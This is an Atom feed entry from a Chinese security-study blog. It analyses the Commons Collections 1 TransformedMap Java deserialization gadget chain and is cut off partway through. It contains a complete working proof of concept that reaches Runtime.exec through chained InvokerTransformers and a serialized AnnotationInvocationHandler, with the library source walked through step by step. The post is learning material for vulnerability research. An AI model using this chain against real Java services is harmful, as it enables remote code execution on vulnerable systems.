<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Xiaopan233 Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-09-04T11:27:06.525Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Xiaopan233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ysoserial学习之番外 - CommonsCollections1 transformedmap链</title>
    <link href="http://example.com/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/"/>
    <id>http://example.com/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/</id>
    <published>2021-05-19T13:43:06.000Z</published>
    <updated>2021-09-04T11:27:06.525Z</updated>
    
    <content type="html"><![CDATA[<p>看完URLDNS之后再看CC链，，这尼玛简直就是一个天一个地。。前前后后大概看了三四天才能勉强说是理解了。然后又花了两天多来写这篇文章。。我感觉我尽力了，，不知道是不是因为我的思维方式还停留在php上，感觉java的文章真是有点难写。。。也许是我太想把每个流程调用都贴出来吧。。后面我会学习下大佬们都是怎么写java文的。。这篇文章就先将就着这样看吧，我尽力了555。。。</p><span id="more"></span><br><p>CommonsCollections。用于提供更好用的数据结构，方便开发快速进行代码开发。</p><p>由于这个链子不在 ysoserial 中，但这个系列的主题为 ysoserial，于是就把这个链子当作番外来命标题了。</p><p><strong>环境</strong></p><p>jdk &lt; 8u71</p><p>maven</p><p><strong>Poc:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">transferMapTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;Runtime.class,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;xcalc&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = declaredConstructor.newInstance(Retention.class, outerMap);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//序列化payload</span></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化，触发漏洞点</span></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        transferMapTest();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从POC中学漏洞，我们可以先去查<a href="https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/index.html">手册</a>，看看对应POC中的类、函数大概干什么的，然后调试跟一跟，看看变量和参数是何时被赋值，进行了什么判断，执行了什么操作。这样在脑海中编织一个大概的轮廓，也许能够有助于我们理解一个漏洞。</p><p>由于这是一个反序列化洞，反序列化类型的漏洞的POC都包含两个大块：</p><ol><li>gadgets - 利用链</li><li>readObject() - 需要能够跳到gadgets</li></ol><br><h1 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h1><p>从Poc中抽出 gadgets 的相关代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;Runtime.class,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;xcalc&quot;</span>&#125;</span><br><span class="line">    )</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br></pre></td></tr></table></figure><p>这里用到的CC库的类有：Transformer、ConstantTransformer、InvokerTransformer、ChainedTransformer、TransformedMap。挨个分析，看Java就得坐的住。</p><br><h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p><strong>手册中定义如下：</strong></p><p><em><span style="color:#c93434">public interface Transformer</span></em></p><p><em>用于将一个对象转换换成另一个对象。通常用于对象转换或从对象中解析数据</em></p><br><p>查看源码，只有一个方法 <code>Object transform()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//用于对输入的Object进行处理，输出新的Object</span></span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p><strong>手册中定义如下：</strong></p><p><em><span style="color:#c93434">public class ConstantTransformer</span></em></p><p><em><span style="color:#c93434">extends Object</span></em></p><p><em><span style="color:#c93434">implements Transformer, Serializable</span></em></p><p><em>Transformer的实现类，任何时候只返回一个相同的“常量”</em></p><br><p>查看源码，列出和本漏洞相关的方法和属性（初初看的时候可以都大概瞄一瞄，这里为了篇幅和演示的原因就只列出和本漏洞相关的方法和属性了）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//由于其实现了前文刚提到的 Transformer接口。</span></span><br><span class="line">    <span class="comment">//可以留意一下其重写的transform()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p><strong>手册中定义如下：</strong></p><p><em><span style="color:#c93434">public class InvokerTransformer</span></em></p><p><em><span style="color:#c93434">extends Object</span></em></p><p><em><span style="color:#c93434">implements Transformer, Serializable</span></em></p><p><em>Transformer的实现类，通过反射创建一个新对象</em></p><br><p>查看源码，列出和本漏洞相关的方法和属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//实现Transformer接口重写的transform()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            .....</span><br><span class="line">            <span class="comment">//如文档中所说，在这里进行了反射操作</span></span><br><span class="line">            <span class="comment">//在反序列化中，类的成员都是我们可控的。所以这里的参数都是可控的</span></span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            .....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p><strong>手册中定义如下：</strong></p><p><span style="color:#c93434"><em>public class ChainedTransformer</em></span></p><p><span style="color:#c93434"><em>extends Object</em></span></p><p><span style="color:#c93434"><em>implements Transformer, Serializable</em></span></p><p><em>Transformer的实现类。将指定的 Transformer 像链子一样串起来。</em></p><p><em>输入的Object会按顺序进入指定的Transformer，得到输出后将结果再传入到第二个Transformer中，以此类推。</em></p><p><em>（有点像 Linux的管道操作，前一个输出作为后一个的输入）</em></p><br><p>查看源码，列出和本漏洞相关的方法和属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//实现Transformer接口重写的transform()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//如文档所说，遍历 this.iTransformers，依次调用对应transform()</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            <span class="comment">//每次调用后都保存返回值，并作为下一次transform()的输入</span></span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p><strong>手册中定义如下：</strong></p><p><span style="color:#c93434"><em>public class TransformedMap</em></span></p><p><em><span style="color:#c93434">extends AbstractMapDecorator</span></em></p><p><span style="color:#c93434"><em>implements Serializable</em></span></p><p><em>修饰Map，通过Transformer转换成对应类型。</em></p><p><em>TransformedMap的父类AbstractMapDecorator实现了Map接口。</em></p><p><em>TransformedMap重写了Map put()方法，TransformedMap父类AbstractInputCheckedMapDecorator重写了Map.MapEntry setValue()方法</em></p><br><p>查看源码，列出和本漏洞相关的方法和属性（不完全）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(entry);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            value = <span class="keyword">this</span>.parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">=============================================</span><br><span class="line"><span class="keyword">package</span> org.apache.commons.collections.map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//工厂方法，返回TransformedMap类实例</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此gadgets大致分析完毕，读者可以动手调试一下，加深理解。</p><br><h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><ol><li>InvokerTransformer类的 <code>transform()</code> 方法中存在可控的反射操作，这个操作就是这个链子的漏洞点。</li><li>Poc中gadgets的最后调用了 <code>TransformedMap.decorate()</code>，该方法返回TransformedMap类实例。 TransformedMap类中 调用 指定类<code>transform()</code>  的操作只有 <code>checkSetValue()</code> , <code>transformKey()</code> 和 <code>transformValue()</code> 方法中存在</li><li>根据 1. 和 2. 并结合Poc来进行推测：该Poc在试图调用到 <code>TransformedMap.checkSetValue()</code> , <code>TransformedMap.transformKey()</code> , <code>TransformedMap.transformValue()</code> 这三者之一来执行 <code>InvokerTransformer.transform()</code>，从而RCE。</li></ol><h3 id="分析gadgets"><a href="#分析gadgets" class="headerlink" title="分析gadgets"></a>分析gadgets</h3><p>这一节我们仅分析 gadgets，目的是理解 gadgets 中如何触发到RCE的（这个漏洞的RCE点是 InvokerTransformer类的 <code>transform()</code> 方法）。所以我们先不找反序列化入口点，先手工调用 gadgets手工触发RCE，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;Runtime.class,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">        <span class="comment">//Runtime.exec() 执行的命令</span></span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;xcalc&quot;</span>&#125;</span><br><span class="line">    )</span><br><span class="line">    &#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"><span class="comment">//通过调用 TransformedMap.put() 来触发</span></span><br><span class="line">outerMap.put(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;tt&quot;</span>);</span><br></pre></td></tr></table></figure><p>简单画了个流程图，当然自己动手跟代码理解起来效果更好</p><img src="/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/1.png" width="1000px"><br><h4 id="关于-InvokerTransformer-反射调用的细节"><a href="#关于-InvokerTransformer-反射调用的细节" class="headerlink" title="关于 InvokerTransformer 反射调用的细节"></a>关于 InvokerTransformer 反射调用的细节</h4><p>估计大家都看到了，Poc中为了执行 <code>xcalc</code>命令，连续用了三次<code>InvokerTransformer()</code>才得解。为什么需要调用那么多次呢？</p><p><strong>首先，</strong>我们得先了解下，<code>.class</code>；<code>.class.getClass()</code>；<code>实例.getClass()</code> 之间都有什么区别。我们可以使用如下代码来测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Runtime.class); <span class="comment">//class java.lang.Runtime</span></span><br><span class="line">System.out.println(Runtime.class.getClass()); <span class="comment">//class java.lang.Class</span></span><br><span class="line">System.out.println(Runtime.getRuntime().getClass()); <span class="comment">//class java.lang.Runtime</span></span><br><span class="line">System.out.println(Runtime.getRuntime().getClass().getClass()); <span class="comment">//class java.lang.Class</span></span><br></pre></td></tr></table></figure><br><p>了解完毕后回到漏洞上来，这是一个反序列化漏洞，Payload需要被序列化。若我们直接给 ConstantTransformer类传入 <code>Runtime.getRuntime()</code> ，会由于 Runtime 没有实现 Serializable 接口而在序列化时报错。</p><p>所以为了能够让 <code>InvokerTransformer.transform()</code> 反射 Runtime类。Poc中采取了折中的办法，这里将Poc和InvokerTransformer抽象成下面的代码，方便理解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 